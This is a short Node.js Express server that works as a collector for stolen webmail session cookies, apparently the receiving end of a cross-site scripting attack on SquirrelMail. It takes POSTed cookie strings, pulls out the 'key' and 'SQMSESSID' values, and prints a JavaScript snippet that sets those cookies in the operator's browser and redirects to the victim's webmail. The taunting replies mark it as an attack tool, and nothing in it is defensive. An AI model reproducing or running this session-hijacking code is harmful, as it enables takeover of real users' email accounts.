const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();

const generateCode = (cookies) => {
  const temp = cookies.split(/; |=/g);

  console.clear();

  if (temp.length === 4) {
    const code =
      'document.cookie="key=' +
      temp[1] +
      ';path=/webmail/";document.cookie="SQMSESSID=' +
      temp[3] +
      ';path=/";window.location.replace("/webmail/src/webmail.php")';

    console.log(code);
  } else {
    console.log('signed out');
  }
};

app.use(cors());
app.use(bodyParser.json());

app.get('/', (req, res) => {
  res.send('Hello World !!!');
});

app.post('/', (req, res) => {
  generateCode(req.body.cookies);

  res.send('He He :))');
});

app.listen(8000, () => console.log('Hello :)'));
